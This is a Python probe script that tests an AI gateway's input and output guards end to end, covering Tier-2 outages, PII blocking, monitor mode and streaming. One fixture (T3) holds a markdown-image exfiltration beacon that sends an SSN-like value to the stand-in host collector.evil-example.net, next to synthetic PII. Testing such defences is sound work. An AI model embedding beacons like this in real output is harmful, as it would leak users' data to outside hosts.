"""Probe E: end-to-end through the REAL FastAPI app (proxy_chat) over httpx.ASGITransport.

Harness = gateway/ai_mesh_gateway/tests/test_openai_sdk_compat.py::_make_sdk_app, reproduced
without pytest: fakeredis-backed API key, stubbed upstream LLM ("Hello from upstream." or a
PII-bearing completion), no control plane (POLICY_SYNC=None -> zero-policy org). The ONLY
additional fakes are the Tier-2 network client (raises / returns canned guard JSON) and
capture functions in place of _emit_telemetry/_audit_fire_and_forget (the SDK harness
replaces them with no-op lambdas). Usage: probe_e2e.py <ROOT>
"""
import asyncio
import hashlib
import json
import os
import sys
from unittest.mock import AsyncMock, MagicMock

ROOT = sys.argv[1]
os.environ["ENABLE_TIER2"] = "false"
os.environ["TIER2_PROVIDER"] = "bedrock"

import fakeredis.aioredis  # noqa: E402
import httpx  # noqa: E402

import ai_mesh_gateway.main as M  # noqa: E402
import ai_mesh_gateway.middleware as MW  # noqa: E402
import output_guard as OG  # noqa: E402
import scanner as S  # noqa: E402

for mod in (M, MW, OG, S):
    assert mod.__file__.startswith(ROOT), (mod.__name__, mod.__file__)
print("ROOT =", ROOT)

API_KEY = "zs_test_sdk_compat_0123456789abcdef"
BASE_CFG = {
    "backend_url": "", "api_key": "", "input_scan_enabled": True, "output_scan_enabled": True,
    "enforcement_mode": "block", "kill_switch_enabled": False, "threat_intel_enabled": False,
    "routing_enabled": False, "stream_preflight_fail_closed": False, "policy_cache_require_loaded": False,
    "stream_emit_debug_headers": False, "stream_finalize_timeout_ms": 1000, "call_security_scan": False,
    "max_response_tokens": 4096, "model_isolation_enabled": False,
}
MODEL = {"model_name": "gpt-4o-mini", "model_id": "gpt-4o-mini", "provider": "openai", "is_active": True, "api_key_set": True}
UPSTREAM_TEXT = {"text": "Hello from upstream."}


async def _fake_completion(body, redacted_prompt=None, **_kw):
    return 200, {"id": "chatcmpl-probe", "object": "chat.completion", "created": 1700000000, "model": "gpt-4o-mini",
                 "usage": {"prompt_tokens": 10, "completion_tokens": 5, "total_tokens": 15},
                 "choices": [{"index": 0, "message": {"role": "assistant", "content": UPSTREAM_TEXT["text"]},
                              "finish_reason": "stop"}]}


async def _fake_stream(body, redacted_prompt=None, metrics=None, **_kw):
    text = UPSTREAM_TEXT["text"]
    parts = [text[: len(text) // 2], text[len(text) // 2:]]
    for i, tok in enumerate(parts):
        chunk = {"id": "chatcmpl-probe-s", "object": "chat.completion.chunk", "created": 1700000000, "model": "gpt-4o-mini",
                 "choices": [{"index": 0, "delta": ({"role": "assistant", "content": tok} if i == 0 else {"content": tok}),
                              "finish_reason": None if i == 0 else "stop"}]}
        yield f"data: {json.dumps(chunk)}\n\n"
    if metrics is not None:
        metrics.completed = True
    yield "data: [DONE]\n\n"


class RaisingClient:
    region = "probe"

    async def ascan_prompt(self, **_kw):
        raise ConnectionError("simulated: guard endpoint unreachable")


class GuardJSONClient:
    region = "probe"

    def __init__(self, payload):
        self.content = json.dumps(payload)

    async def ascan_prompt(self, **_kw):
        return {"raw": {"choices": [{"message": {"content": self.content}}]}, "tokens_in": 10, "tokens_out": 30}


class EmptyClient:
    region = "probe"

    async def ascan_prompt(self, **_kw):
        return {"raw": {"choices": [{"message": {"content": ""}}]}, "tokens_in": 10, "tokens_out": 0}


class OutputOnlyFailClient:
    """Healthy (allow) for the INPUT scan; raises for the OUTPUT scan (payload carries MARKER)."""
    region = "probe"
    MARKER = "upstream-marker-7f3a"

    async def ascan_prompt(self, **kw):
        if self.MARKER in json.dumps(kw.get("prompt_payload")):
            raise ConnectionError("simulated: guard endpoint unreachable (output scan)")
        return {"raw": {"choices": [{"message": {"content": json.dumps(
            {"findings": [], "risk_score": 0, "recommended_action": "allow"})}}]}, "tokens_in": 10, "tokens_out": 30}


TEL, AUD = [], []


def _cap_tel(**kw):
    TEL.append({k: kw.get(k) for k in ("event_type", "action", "threat_type", "status_code", "pipeline_stage")})


def _cap_aud(**kw):
    AUD.append({k: kw.get(k) for k in ("decision", "rule_code")})


async def build_app(org_cfg, *, t2_client=None, output_guard=False):
    auth_redis = fakeredis.aioredis.FakeRedis(decode_responses=True)
    payload = {"key_id": "550e8400-e29b-41d4-a716-446655440042", "prefix": API_KEY[:8], "user_id": 1,
               "project_id": "proj-probe", "org_slug": "", "organization_id": "org-probe",
               "permissions": {"allowed_actions": ["chat", "completion", "embedding"], "denied_actions": []},
               "allowed_models": ["gpt-4o-mini"], "rate_limit_tpm": 50000, "risk_score": 0.0,
               "is_active": True, "expires_at": None}
    await auth_redis.set(f"auth:apikey:{hashlib.sha256(API_KEY.encode()).hexdigest()}", json.dumps(payload))

    async def _get_redis(self):
        return auth_redis

    MW.AuthMiddleware._get_redis = _get_redis
    cfg = dict(BASE_CFG, **org_cfg)
    cs = MagicMock()
    cs.get_config = MagicMock(return_value=dict(cfg))
    cs.get_model_routing = MagicMock(return_value=[dict(MODEL)])
    cs.reload_models_now = AsyncMock()
    cs.get_fallback_chains = MagicMock(return_value={"chains": {}, "per_primary": {}})
    router = MagicMock()
    router.acompletion = AsyncMock(side_effect=_fake_completion)
    router.acompletion_stream = _fake_stream
    router.get_model_list = MagicMock(return_value=[{"id": "gpt-4o-mini", "object": "model", "created": 1, "owned_by": "openai"}])
    router.estimate_prompt_tokens = MagicMock(return_value=500)
    scn = S.InputScanner(thread_pool_size=2, config=cfg)
    if t2_client is not None:
        scn.tier2_enabled = True
        scn._bedrock_scanner = S.BedrockScanner(client=t2_client, model="global.anthropic.claude-haiku-probe")
    S.BREAKER._states.clear()  # fresh breaker per scenario (process-local LRU state)
    for name, val in (("CONFIG", dict(cfg)), ("CONFIG_SYNC", cs), ("LLM_ROUTER", router), ("INPUT_SCANNER", scn),
                      ("AGENT_ID", None), ("POLICY_SYNC", None), ("RATE_LIMITER", None), ("CIRCUIT_BREAKER", None),
                      ("REDIS_CLIENT", None), ("TELEMETRY", None),
                      ("OUTPUT_GUARD", OG.OutputGuard(scanner=scn, config=dict(cfg)) if output_guard else None),
                      ("_emit_telemetry", _cap_tel), ("_audit_fire_and_forget", _cap_aud)):
        setattr(M, name, val)
    return M.app


async def send(app, prompt, n=1, stream=False):
    out = []
    async with httpx.AsyncClient(transport=httpx.ASGITransport(app=app), base_url="http://testserver") as c:
        for _ in range(n):
            TEL.clear(); AUD.clear()
            req = {"model": "gpt-4o-mini", "messages": [{"role": "user", "content": prompt}], "stream": stream}
            r = await c.post("/v1/chat/completions", headers={"Authorization": f"Bearer {API_KEY}"}, json=req)
            reason = None
            if stream and r.status_code == 200 and "text/event-stream" in r.headers.get("content-type", ""):
                deltas, errs, zs = [], [], {}
                for line in r.text.splitlines():
                    if not line.startswith("data: ") or line == "data: [DONE]":
                        continue
                    try:
                        ev = json.loads(line[6:])
                    except Exception:
                        continue
                    if isinstance(ev.get("error"), (dict, str)):
                        errs.append(ev["error"] if isinstance(ev["error"], str) else ev["error"].get("message"))
                    for ch in ev.get("choices") or []:
                        deltas.append((ch.get("delta") or {}).get("content") or "")
                    if ev.get("zeroshield"):
                        zs = ev["zeroshield"]
                body, content, err = {}, "".join(deltas), {"code": ("SSE_ERROR_FRAME: " + "; ".join(map(str, errs))) if errs else None}
            else:
                try:
                    body = r.json()
                except Exception:
                    body = {"raw": r.text[:200]}
                zs = body.get("zeroshield") or {}
                err = body.get("error") if isinstance(body.get("error"), dict) else {}
                content = ((body.get("choices") or [{}])[0].get("message") or {}).get("content") if r.status_code == 200 else None
                reason = body.get("reason") or err.get("message")
            out.append({"status": r.status_code, "zs.action": zs.get("action"), "zs.threat_type": zs.get("threat_type"),
                        "err.code": err.get("code"), "top.code": body.get("code"), "content": content, "reason": reason,
                        "telemetry": [e for e in TEL], "audit": [a for a in AUD]})
    return out


def show(label, rows):
    print(f"\n[{label}]")
    for i, row in enumerate(rows, 1):
        tel = [(e["event_type"], e["action"], e["threat_type"]) for e in row["telemetry"]]
        print(f"  #{i} status={row['status']} zs.action={row['zs.action']!r} zs.threat={row['zs.threat_type']!r} "
              f"err.code={row['err.code']!r} top.code={row['top.code']!r} content={row['content']!r}")
        if row.get("reason"):
            print(f"      reason={row['reason']!r}")
        print(f"      telemetry={tel} audit={[(a['decision'], a['rule_code']) for a in row['audit']]}")


async def main():
    CLEAN = "Summarise the attached quarterly planning notes in three bullet points."
    # E0 sanity
    show("E0 clean prompt, Tier-2 off", await send(await build_app({}), CLEAN))
    # E1 backticks, Tier-2 off (zero-policy org)
    app = await build_app({})
    for p in ["What does `git rebase -i` do?", "Why does `list.sort()` return None in Python?",
              "How do I read `process.env.NODE_ENV` inside a Next.js API route?",
              "What's the difference between `String` and `&str` in Rust?",
              "My Dockerfile runs `npm ci && npm run build` but the image is 2 GB. How can I slim it down?"]:
        show(f"E1 backtick prompt {p[:40]!r}", await send(app, p))
    # E2 input Tier-2 outage (Bedrock client error), org tier2_enabled=True, strict default
    show("E2 input Tier-2 client_error, clean prompt", await send(await build_app({"tier2_enabled": True}, t2_client=RaisingClient()), CLEAN))
    # E3 sustained outage -> breaker
    rows = await send(await build_app({"tier2_enabled": True}, t2_client=RaisingClient()), CLEAN, n=7)
    print("\n[E3 sustained input outage, tier2_strict default(True)] statuses:", [r["status"] for r in rows],
          "codes:", [r["err.code"] or r["zs.action"] for r in rows])
    rows = await send(await build_app({"tier2_enabled": True, "tier2_strict": False}, t2_client=RaisingClient()), CLEAN, n=7)
    print("[E3b sustained input outage, tier2_strict=False] statuses:", [r["status"] for r in rows],
          "zs.action:", [r["zs.action"] for r in rows])
    # E4 Tier-2 flag outside the adapter's sets (real scanner: monitor rec + obfuscation finding)
    g = {"findings": [{"rule_id": "OBF-01", "category": "obfuscation", "severity": "medium", "evidence": "x", "confidence": 0.6}],
         "risk_score": 20, "recommended_action": "monitor"}
    show("E4 Tier-2 flag/obfuscation", await send(await build_app({"tier2_enabled": True}, t2_client=GuardJSONClient(g)), CLEAN))
    g = {"findings": [], "risk_score": 55, "recommended_action": "allow"}
    show("E4b Tier-2 flag/risk_score (score 0.55)", await send(await build_app({"tier2_enabled": True}, t2_client=GuardJSONClient(g)), CLEAN))
    # E5 label divergence
    for cat in ("injection", "prompt_injection"):
        g = {"findings": [{"rule_id": "X-1", "category": cat, "severity": "medium", "evidence": "x", "confidence": 0.30}],
             "risk_score": 30, "recommended_action": "block"}
        show(f"E5 Tier-2 block conf=0.30 category={cat}", await send(await build_app({"tier2_enabled": True}, t2_client=GuardJSONClient(g)), CLEAN))
    # O: output path. tier2_enabled UNSET -> input Tier-1 only, output Tier-2 runs (scanner-wide flag)
    for prov in ("bedrock", "gemini"):
        os.environ["TIER2_PROVIDER"] = prov
        UPSTREAM_TEXT["text"] = "Hello from upstream."
        show(f"O1 output Tier-2 client_error, provider={prov}, clean completion",
             await send(await build_app({}, t2_client=RaisingClient(), output_guard=True), CLEAN))
        UPSTREAM_TEXT["text"] = "Sure. The customer's SSN is 123-45-6789 and email jane.roe@example.com."
        show(f"O2 output_pii_action=block, PII completion, provider={prov}, output Tier-2 client_error",
             await send(await build_app({"output_pii_action": "block"}, t2_client=RaisingClient(), output_guard=True), CLEAN))
        show(f"O2-control output_pii_action=block, PII completion, provider={prov}, output Tier-2 HEALTHY (allow)",
             await send(await build_app({"output_pii_action": "block"},
                                        t2_client=GuardJSONClient({"findings": [], "risk_score": 0, "recommended_action": "allow"}),
                                        output_guard=True), CLEAN))
    os.environ["TIER2_PROVIDER"] = "bedrock"
    # O3 monitor posture on the output path
    UPSTREAM_TEXT["text"] = "Sure. The customer's SSN is 123-45-6789 and email jane.roe@example.com."
    HEALTHY = {"findings": [], "risk_score": 0, "recommended_action": "allow"}
    for stream in (False, True):
        show(f"O3 enforcement_mode=monitor, output_pii_action=block, PII completion, output Tier-2 healthy, stream={stream}",
             await send(await build_app({"enforcement_mode": "monitor", "output_pii_action": "block"},
                                        t2_client=GuardJSONClient(HEALTHY), output_guard=True), CLEAN, stream=stream))
    # E2g: Gemini provider, INPUT Tier-2 failures
    os.environ["TIER2_PROVIDER"] = "gemini"
    UPSTREAM_TEXT["text"] = "Hello from upstream."
    show("E2g input Tier-2 client_error, provider=gemini",
         await send(await build_app({"tier2_enabled": True}, t2_client=RaisingClient()), CLEAN))
    show("E2g-parse input Tier-2 empty guard output, provider=gemini",
         await send(await build_app({"tier2_enabled": True}, t2_client=EmptyClient()), CLEAN))
    # ---- T-series: org tier2_enabled=True so the STREAMING output guard is attached too
    #      (main.py:4373-4382). Input Tier-2 healthy; OUTPUT Tier-2 fails (OutputOnlyFailClient).
    MK = OutputOnlyFailClient.MARKER
    T_CASES = [
        ("T1 clean completion", {}, f"Hello from upstream ({MK})."),
        ("T2 pii=block, SSN completion", {"output_pii_action": "block"}, f"Customer SSN 123-45-6789 ({MK})."),
        ("T3 pii=block + markdown-image exfil beacon (exfil default=redact)", {"output_pii_action": "block"},
         f"Customer SSN 123-45-6789. ![chart](https://collector.evil-example.net/p.png?d=123-45-6789) ({MK})"),
    ]
    for prov in ("bedrock", "gemini"):
        for label, extra, text in T_CASES:
            UPSTREAM_TEXT["text"] = text
            for healthy in (False, True):
                client = GuardJSONClient(HEALTHY) if healthy else OutputOnlyFailClient()
                for stream in (False, True):
                    os.environ["TIER2_PROVIDER"] = prov
                    show(f"{label} | provider={prov} | output Tier-2 {'HEALTHY' if healthy else 'client_error'} | stream={stream}",
                         await send(await build_app(dict({"tier2_enabled": True}, **extra), t2_client=client,
                                                    output_guard=True), CLEAN, stream=stream))
    os.environ["TIER2_PROVIDER"] = "bedrock"
    # T4: P7 on both output paths with the streaming guard attached
    UPSTREAM_TEXT["text"] = "Customer SSN 123-45-6789."
    for stream in (False, True):
        show(f"T4 enforcement_mode=monitor, pii=block, SSN completion, Tier-2 healthy, stream={stream}",
             await send(await build_app({"tier2_enabled": True, "enforcement_mode": "monitor", "output_pii_action": "block"},
                                        t2_client=GuardJSONClient(HEALTHY), output_guard=True), CLEAN, stream=stream))


asyncio.run(main())
